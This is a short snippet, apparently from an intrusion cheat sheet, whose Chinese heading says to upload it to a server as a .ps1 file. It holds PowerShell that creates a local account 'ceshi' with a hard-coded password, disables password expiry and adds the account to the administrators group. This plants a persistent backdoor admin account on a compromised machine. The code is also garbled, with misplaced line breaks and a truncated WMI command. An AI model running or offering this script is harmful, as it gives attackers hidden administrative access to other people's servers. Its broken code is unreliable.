## 复制上传到服务器上,后缀名为ps1  

```
$nt=[adsi]"WinNT://localhost"
$user=$nt.create("user","ceshi"
)$user.setpassword("abc123456"
)$user
.setinfo()in32_UserAccount -Filter "name = 'ceshi'"
 | Set-WmiInstance -Argument @{PasswordExpires = 0}$group=[ADSI]"WinNT://localhost/administrators,group"
$group.add("WinNT://$env:USERDOMAIN/ceshi,user"
)

```
